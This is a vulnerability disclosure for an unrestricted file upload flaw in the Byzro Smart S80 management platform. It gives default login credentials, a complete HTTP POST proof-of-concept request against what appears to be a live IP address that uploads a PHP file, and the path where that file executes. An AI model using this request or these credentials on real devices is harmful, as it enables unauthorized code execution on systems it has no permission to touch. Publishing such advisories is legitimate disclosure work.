There is a file upload vulnerability in Byzro Networks Smart S80 management platform

Vulnerability impact
Smart S80

Vulnerability location
/useratte/userattestation.php

 Code analysis
The code enters the hidwel branch, and the uploaded files in lines 125 and 126 of the code do not have any suffix restrictions, causing arbitrary files to be uploaded.

![image](https://github.com/garboa/cve_3/assets/22628693/2855690d-1cd0-41ca-b828-bf2dae14b582)

Vulnerability recurrence

1. The login interface is as shown in the figure.
admin/20015480

![image](https://github.com/garboa/cve_3/assets/22628693/74ac80f2-56e7-4627-8fb1-cc25a166df7c)

2. Construct a POC and directly upload the 1.php file.

POC
```
POST /useratte/userattestation.php HTTP/1.1
Host: 125.67.126.126:8443
Cookie: PHPSESSID=3d84a3f37f3c61d543c5cd2236640eb4
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 593
Origin: https://125.67.126.126:8443
Referer: https://125.67.126.126:8443/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php echo 123;?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328?
```

![image](https://github.com/garboa/cve_3/assets/22628693/a51566bf-71b7-47c7-9a1b-94a2ce63622f)

Visit /boot/web/upload/weblogo/1.php

![image](https://github.com/garboa/cve_3/assets/22628693/568dbafa-f0e3-4ded-b1a9-3dca6e1b45fd)

